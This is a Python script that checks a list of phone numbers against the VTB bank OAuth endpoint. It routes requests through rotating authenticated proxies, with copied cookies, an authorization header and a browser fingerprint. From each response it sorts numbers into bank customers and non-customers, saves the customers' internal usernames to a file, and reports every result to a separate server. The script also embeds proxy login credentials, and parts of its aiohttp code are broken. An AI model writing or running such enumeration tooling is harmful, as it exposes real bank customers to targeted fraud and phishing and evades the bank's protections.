import time
import requests
import json
import random
import threading
import asyncio
import aiohttp

proxy_list = [
        '45.159.87.56:64528',
        '45.15.238.97:63424',
        '195.208.56.109:63162',
        '84.54.31.109:63614',
        '45.145.168.113:64772',
        '45.94.20.84:64634',
        '45.147.14.78:64722',
        '45.145.168.171:63298',
        '45.150.63.169:64340',
        '45.147.1.211:64786',
        '92.249.13.125:63342',
        '45.142.37.125:62392',
        '193.17.65.63:61918',
        '194.104.237.24:62660',
        '213.209.134.189:61636',
        '212.193.102.55:63672',
        '212.193.167.107:63806',
        '194.85.181.98:64944'

        ]
headers ={
        'Host':'cl.vtb.ru',
        'Accept-Encoding' : 'gzip, deflate, br',
        'Content-Length' : '58',
        'Origin': 'https://cl.vtb.ru',
        'Connection': 'keep-alive',
        'Referer': 'https://cl.vtb.ru/sms-confirmation',
        'Cookie': '_ym_uid=1677250294707066510; _ym_d=1678780491; tmr_lvid=48f566c6f3a52d5cf4f0ea12b9a433a6; tmr_lvidTS=1677599999156; _a_d3t6sf=duXOe3Q_WDNC3aEqQkbVm4HT; pixel_sess_id=cec554c6-c9f4-4cec-9f5d-0aea29e7de21; adrcid=ARNZHjZKsH8fWKvVPtnTjrg; pixel_user_fp=8e4a7e311fc141a1532511df8f6e2d16; pixel_user_dt=1685690668199; client_source={"utmSource":"direct_","utmMedium":"none","utmCampaign":"(not set)","utmTerm":"(not set)","utmContent":"(not set)","utmGa":"","actionId":""}; utm_source=direct_; utm_medium=none; utm_campaign=(not set); utm_term=(not set); utm_content=(not set)',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Authorization': 'Basic TWFsenNSQWtzUVh3QW9lVHFNQ3ptR3k3WldnYToyVUJ4bHpXWjZuaHQ2RWsybWhxOVNPT0Q3cmdh',
        'X-Finger-Print': 'JTdCJTIyZm9udHMlMjIlM0ElN0IlMjJ2YWx1ZSUyMiUzQSU1QiUyMkFnZW5jeSUyMEZCJTIyJTJDJTIyQXJpYWwlMjBVbmljb2RlJTIwTVMlMjIlMkMlMjJDYWxpYnJpJTIyJTJDJTIyQ2VudHVyeSUyMiUyQyUyMkNlbnR1cnklMjBHb3RoaWMlMjIlMkMlMjJGcmFua2xpbiUyMEdvdGhpYyUyMiUyQyUyMkhhZXR0ZW5zY2h3ZWlsZXIlMjIlMkMlMjJMdWNpZGElMjBCcmlnaHQlMjIlMkMlMjJMdWNpZGElMjBTYW5zJTIyJTJDJTIyTVMlMjBPdXRsb29rJTIyJTJDJTIyTVMlMjBSZWZlcmVuY2UlMjBTcGVjaWFsdHklMjIlMkMlMjJNUyUyMFVJJTIwR290aGljJTIyJTJDJTIyTVQlMjBFeHRyYSUyMiUyQyUyMk1ZUklBRCUyMFBSTyUyMiUyQyUyMk1hcmxldHQlMjIlMkMlMjJNZWlyeW8lMjBVSSUyMiUyQyUyMk1vbm90eXBlJTIwQ29yc2l2YSUyMiUyQyUyMlByaXN0aW5hJTIyJTJDJTIyU2Vnb2UlMjBVSSUyMExpZ2h0JTIyJTVEJTJDJTIyZHVyYXRpb24lMjIlM0ExNTUlN0QlMkMlMjJkb21CbG9ja2VycyUyMiUzQSU3QiUyMmR1cmF0aW9uJTIyJTNBMCU3RCUyQyUyMmZvbnRQcmVmZXJlbmNlcyUyMiUzQSU3QiUyMnZhbHVlJTIyJTNBJTdCJTIyZGVmYXVsdCUyMiUzQTE0OS4zMTI1JTJDJTIyYXBwbGUlMjIlM0ExNDkuMzEyNSUyQyUyMnNlcmlmJTIyJTNBMTQ5LjMxMjUlMkMlMjJzYW5zJTIyJTNBMTQ0LjAxNTYyNSUyQyUyMm1vbm8lMjIlM0ExMjEuNTE1NjI1JTJDJTIybWluJTIyJTNBOS4zNDM3NSUyQyUyMnN5c3RlbSUyMiUzQTE0Ny44NTkzNzUlN0QlMkMlMjJkdXJhdGlvbiUyMiUzQTM1JTdEJTJDJTIyYXVkaW8lMjIlM0ElN0IlMjJ2YWx1ZSUyMiUzQTEyNC4wNDM0NzUyNzUxNjA3NCUyQyUyMmR1cmF0aW9uJTIyJTNBODUlN0QlMkMlMjJzY3JlZW5GcmFtZSUyMiUzQSU3QiUyMnZhbHVlJTIyJTNBJTVCLTEyMCUyQzE5MjAlMkMxNjAlMkMtMTkyMCU1RCUyQyUyMmR1cmF0aW9uJTIyJTNBMiU3RCUyQyUyMm9zQ3B1JTIyJTNBJTdCJTIyZHVyYXRpb24lMjIlM0EwJTdEJTJDJTIybGFuZ3VhZ2VzJTIyJTNBJTdCJTIydmFsdWUlMjIlM0ElNUIlNUIlMjJydS1SVSUyMiU1RCU1RCUyQyUyMmR1cmF0aW9uJTIyJTNBMCU3RCUyQyUyMmNvbG9yRGVwdGglMjIlM0ElN0IlMjJ2YWx1ZSUyMiUzQTI0JTJDJTIyZHVyYXRpb24lMjIlM0EwJTdEJTJDJTIyZGV2aWNlTWVtb3J5JTIyJTNBJTdCJTIydmFsdWUlMjIlM0E4JTJDJTIyZHVyYXRpb24lMjIlM0EwJTdEJTJDJTIyc2NyZWVuUmVzb2x1dGlvbiUyMiUzQSU3QiUyMnZhbHVlJTIyJTNBJTVCMTkyMCUyQzEyMDAlNUQlMkMlMjJkdXJhdGlvbiUyMiUzQTAlN0QlMkMlMjJoYXJkd2FyZUNvbmN1cnJlbmN5JTIyJTNBJTdCJTIydmFsdWUlMjIlM0EyJTJDJTIyZHVyYXRpb24lMjIlM0EwJTdEJTJDJTIydGltZXpvbmUlMjIlM0ElN0IlMjJ2YWx1ZSUyMiUzQSUyMkV1cm9wZSUyRk1vc2NvdyUyMiUyQyUyMmR1cmF0aW9uJTIyJTNBNSU3RCUyQyUyMnNlc3Npb25TdG9yYWdlJTIyJTNBJTdCJTIydmFsdWUlMjIlM0F0cnVlJTJDJTIyZHVyYXRpb24lMjIlM0EwJTdEJTJDJTIybG9jYWxTdG9yYWdlJTIyJTNBJTdCJTIydmFsdWUlMjIlM0F0cnVlJTJDJTIyZHVyYXRpb24lMjIlM0EwJTdEJTJDJTIyaW5kZXhlZERCJTIyJTNBJTdCJTIydmFsdWUlMjIlM0F0cnVlJTJDJTIyZHVyYXRpb24lMjIlM0EwJTdEJTJDJTIyb3BlbkRhdGFiYXNlJTIyJTNBJTdCJTIydmFsdWUlMjIlM0F0cnVlJTJDJTIyZHVyYXRpb24lMjIlM0EwJTdEJTJDJTIyY3B1Q2xhc3MlMjIlM0ElN0IlMjJkdXJhdGlvbiUyMiUzQTElN0QlMkMlMjJwbGF0Zm9ybSUyMiUzQSU3QiUyMnZhbHVlJTIyJTNBJTIyV2luMzIlMjIlMkMlMjJkdXJhdGlvbiUyMiUzQTAlN0QlMkMlMjJwbHVnaW5zJTIyJTNBJTdCJTIydmFsdWUlMjIlM0ElNUIlN0IlMjJuYW1lJTIyJTNBJTIyUERGJTIwVmlld2VyJTIyJTJDJTIyZGVzY3JpcHRpb24lMjIlM0ElMjJQb3J0YWJsZSUyMERvY3VtZW50JTIwRm9ybWF0JTIyJTJDJTIybWltZVR5cGVzJTIyJTNBJTVCJTdCJTIydHlwZSUyMiUzQSUyMmFwcGxpY2F0aW9uJTJGcGRmJTIyJTJDJTIyc3VmZml4ZXMlMjIlM0ElMjJwZGYlMjIlN0QlMkMlN0IlMjJ0eXBlJTIyJTNBJTIydGV4dCUyRnBkZiUyMiUyQyUyMnN1ZmZpeGVzJTIyJTNBJTIycGRmJTIyJTdEJTVEJTdEJTJDJTdCJTIybmFtZSUyMiUzQSUyMkNocm9tZSUyMFBERiUyMFZpZXdlciUyMiUyQyUyMmRlc2NyaXB0aW9uJTIyJTNBJTIyUG9ydGFibGUlMjBEb2N1bWVudCUyMEZvcm1hdCUyMiUyQyUyMm1pbWVUeXBlcyUyMiUzQSU1QiU3QiUyMnR5cGUlMjIlM0ElMjJhcHBsaWNhdGlvbiUyRnBkZiUyMiUyQyUyMnN1ZmZpeGVzJTIyJTNBJTIycGRmJTIyJTdEJTJDJTdCJTIydHlwZSUyMiUzQSUyMnRleHQlMkZwZGYlMjIlMkMlMjJzdWZmaXhlcyUyMiUzQSUyMnBkZiUyMiU3RCU1RCU3RCUyQyU3QiUyMm5hbWUlMjIlM0ElMjJDaHJvbWl1bSUyMFBERiUyMFZpZXdlciUyMiUyQyUyMmRlc2NyaXB0aW9uJTIyJTNBJTIyUG9ydGFibGUlMjBEb2N1bWVudCUyMEZvcm1hdCUyMiUyQyUyMm1pbWVUeXBlcyUyMiUzQSU1QiU3QiUyMnR5cGUlMjIlM0ElMjJhcHBsaWNhdGlvbiUyRnBkZiUyMiUyQyUyMnN1ZmZpeGVzJTIyJTNBJTIycGRmJTIyJTdEJTJDJTdCJTIydHlwZSUyMiUzQSUyMnRleHQlMkZwZGYlMjIlMkMlMjJzdWZmaXhlcyUyMiUzQSUyMnBkZiUyMiU3RCU1RCU3RCUyQyU3QiUyMm5hbWUlMjIlM0ElMjJNaWNyb3NvZnQlMjBFZGdlJTIwUERGJTIwVmlld2VyJTIyJTJDJTIyZGVzY3JpcHRpb24lMjIlM0ElMjJQb3J0YWJsZSUyMERvY3VtZW50JTIwRm9ybWF0JTIyJTJDJTIybWltZVR5cGVzJTIyJTNBJTVCJTdCJTIydHlwZSUyMiUzQSUyMmFwcGxpY2F0aW9uJTJGcGRmJTIyJTJDJTIyc3VmZml4ZXMlMjIlM0ElMjJwZGYlMjIlN0QlMkMlN0IlMjJ0eXBlJTIyJTNBJTIydGV4dCUyRnBkZiUyMiUyQyUyMnN1ZmZpeGVzJTIyJTNBJTIycGRmJTIyJTdEJTVEJTdEJTJDJTdCJTIybmFtZSUyMiUzQSUyMldlYktpdCUyMGJ1aWx0LWluJTIwUERGJTIyJTJDJTIyZGVzY3JpcHRpb24lMjIlM0ElMjJQb3J0YWJsZSUyMERvY3VtZW50JTIwRm9ybWF0JTIyJTJDJTIybWltZVR5cGVzJTIyJTNBJTVCJTdCJTIydHlwZSUyMiUzQSUyMmFwcGxpY2F0aW9uJTJGcGRmJTIyJTJDJTIyc3VmZml4ZXMlMjIlM0ElMjJwZGYlMjIlN0QlMkMlN0IlMjJ0eXBlJTIyJTNBJTIydGV4dCUyRnBkZiUyMiUyQyUyMnN1ZmZpeGVzJTIyJTNBJTIycGRmJTIyJTdEJTVEJTdEJTVEJTJDJTIyZHVyYXRpb24lMjIlM0EwJTdEJTJDJTIydG91Y2hTdXBwb3J0JTIyJTNBJTdCJTIydmFsdWUlMjIlM0ElN0IlMjJtYXhUb3VjaFBvaW50cyUyMiUzQTAlMkMlMjJ0b3VjaEV2ZW50JTIyJTNBZmFsc2UlMkMlMjJ0b3VjaFN0YXJ0JTIyJTNBZmFsc2UlN0QlMkMlMjJkdXJhdGlvbiUyMiUzQTAlN0QlMkMlMjJ2ZW5kb3IlMjIlM0ElN0IlMjJ2YWx1ZSUyMiUzQSUyMkdvb2dsZSUyMEluYy4lMjIlMkMlMjJkdXJhdGlvbiUyMiUzQTAlN0QlMkMlMjJ2ZW5kb3JGbGF2b3JzJTIyJTNBJTdCJTIydmFsdWUlMjIlM0ElNUIlMjJjaHJvbWUlMjIlNUQlMkMlMjJkdXJhdGlvbiUyMiUzQTElN0QlMkMlMjJjb29raWVzRW5hYmxlZCUyMiUzQSU3QiUyMnZhbHVlJTIyJTNBdHJ1ZSUyQyUyMmR1cmF0aW9uJTIyJTNBNCU3RCUyQyUyMmNvbG9yR2FtdXQlMjIlM0ElN0IlMjJ2YWx1ZSUyMiUzQSUyMnNyZ2IlMjIlMkMlMjJkdXJhdGlvbiUyMiUzQTAlN0QlMkMlMjJpbnZlcnRlZENvbG9ycyUyMiUzQSU3QiUyMmR1cmF0aW9uJTIyJTNBMCU3RCUyQyUyMmZvcmNlZENvbG9ycyUyMiUzQSU3QiUyMnZhbHVlJTIyJTNBZmFsc2UlMkMlMjJkdXJhdGlvbiUyMiUzQTElN0QlMkMlMjJtb25vY2hyb21lJTIyJTNBJTdCJTIydmFsdWUlMjIlM0EwJTJDJTIyZHVyYXRpb24lMjIlM0EwJTdEJTJDJTIyY29udHJhc3QlMjIlM0ElN0IlMjJ2YWx1ZSUyMiUzQTAlMkMlMjJkdXJhdGlvbiUyMiUzQTAlN0QlMkMlMjJyZWR1Y2VkTW90aW9uJTIyJTNBJTdCJTIydmFsdWUlMjIlM0FmYWxzZSUyQyUyMmR1cmF0aW9uJTIyJTNBMCU3RCUyQyUyMmhkciUyMiUzQSU3QiUyMnZhbHVlJTIyJTNBZmFsc2UlMkMlMjJkdXJhdGlvbiUyMiUzQTAlN0QlMkMlMjJtYXRoJTIyJTNBJTdCJTIydmFsdWUlMjIlM0ElN0IlMjJhY29zJTIyJTNBMS40NDczNTg4NjU4Mjc4NTIyJTJDJTIyYWNvc2glMjIlM0E3MDkuODg5MzU1ODIyNzI2JTJDJTIyYWNvc2hQZiUyMiUzQTM1NS4yOTEyNTE1MDE2NDMlMkMlMjJhc2luJTIyJTNBMC4xMjM0Mzc0NjA5NjcwNDQzNSUyQyUyMmFzaW5oJTIyJTNBMC44ODEzNzM1ODcwMTk1NDMlMkMlMjJhc2luaFBmJTIyJTNBMC44ODEzNzM1ODcwMTk1NDI5JTJDJTIyYXRhbmglMjIlM0EwLjU0OTMwNjE0NDMzNDA1NDglMkMlMjJhdGFuaFBmJTIyJTNBMC41NDkzMDYxNDQzMzQwNTQ4JTJDJTIyYXRhbiUyMiUzQTAuNDYzNjQ3NjA5MDAwODA2MSUyQyUyMnNpbiUyMiUzQTAuODE3ODgxOTEyMTE1OTA4NSUyQyUyMnNpbmglMjIlM0ExLjE3NTIwMTE5MzY0MzgwMTQlMkMlMjJzaW5oUGYlMjIlM0EyLjUzNDM0MjEwNzg3MzMyNCUyQyUyMmNvcyUyMiUzQS0wLjgzOTA3MTUyOTAwOTUzNzclMkMlMjJjb3NoJTIyJTNBMS41NDMwODA2MzQ4MTUyNDM3JTJDJTIyY29zaFBmJTIyJTNBMS41NDMwODA2MzQ4MTUyNDM3JTJDJTIydGFuJTIyJTNBLTEuNDIxNDQ4ODIzODc0NzI0NSUyQyUyMnRhbmglMjIlM0EwLjc2MTU5NDE1NTk1NTc2NDklMkMlMjJ0YW5oUGYlMjIlM0EwLjc2MTU5NDE1NTk1NTc2NDklMkMlMjJleHAlMjIlM0EyLjcxODI4MTgyODQ1OTA0NSUyQyUyMmV4cG0xJTIyJTNBMS43MTgyODE4Mjg0NTkwNDUlMkMlMjJleHBtMVBmJTIyJTNBMS43MTgyODE4Mjg0NTkwNDUlMkMlMjJsb2cxcCUyMiUzQTIuMzk3ODk1MjcyNzk4MzcwNyUyQyUyMmxvZzFwUGYlMjIlM0EyLjM5Nzg5NTI3Mjc5ODM3MDclMkMlMjJwb3dQSSUyMiUzQTEuOTI3NTgxNDE2MDU2MDIwNGUtNTAlN0QlMkMlMjJkdXJhdGlvbiUyMiUzQTAlN0QlN0Q='
            }


async def check_1():
   
    
    
    with open('base2.txt', 'r',encoding='utf-8') as src:
        nums = src.readlines()
        clients = 0
        no_clients = 0
        for i in nums:

                info_proxy = random.choice(proxy_list).split(':')
                print(info_proxy)
                proxy_host = info_proxy[0]
                proxy_port = info_proxy[1]
                proxy_username = 'tyAqwqgu'
                proxy_password = 'ANZnpaLE'
                proxy = f'http://{proxy_username}:{proxy_password}@{proxy_host}:{proxy_port}'
                proxies = {
                    'http': proxy,
                    'https': proxy
                    }
                data = {
                'phone_number': f'{int(i)}',
                'grant_type': 'guest_auth',
                'scope': 'openid'
                }
                async with aiohttp.ClientSession() as session:
                    try:
                        async with session.post('https://cl.vtb.ru/oauth2/token', headers=headers,proxies=proxies , data=data) as r:
                            time.sleep(0.5)
                            if r.status_code == 401:
                                j = json.loads(r.text)  # обрезаем лишнее обрамление у JSON
                                with open('vtb1.json', 'w+') as src:
                                    src.write(json.dumps(j, indent=2))
                                with open('vtb1.json', 'r', encoding='utf-8') as sr:
                                    check = sr.read()
                                    templates = json.loads(check)
                                out = templates['additional_properties']['domain']
                                unk = templates['additional_properties']['username']
                                
                                if out == 'master':
                                    request_server = requests.get(f'http://172.16.1.238:5000/vtb.txt/{i}')
                                    clients += 1
                                    num_unl = i.split('\n')[0]
                                    with open('UNK.txt', 'a',encoding='utf-8') as src_u:
                                        src_u.write(f'{num_unl};{unk}\n')
                                    print(f'|RESULT| => |CLIENT| |{no_clients}|\n|PROXY| => {proxy_host}:{proxy_port}')


                                if out == 'guest':
                                    request_server = requests.get(f'http://172.16.1.238:5000/novtb.txt/{i}')
                                    no_clients += 1
                                    print(f'|RESULT| => |NO CLIENT| |{no_clients}|\n|PROXY| => {proxy_host}:{proxy_port}')

                            

                    except:
                        print(f'PORXY SDOH,POKA: {proxy_host}:{proxy_port}')
                        proxy_list.remove(proxy_host+':'+proxy_port)
                        continue
            
asyncio.run(check_1())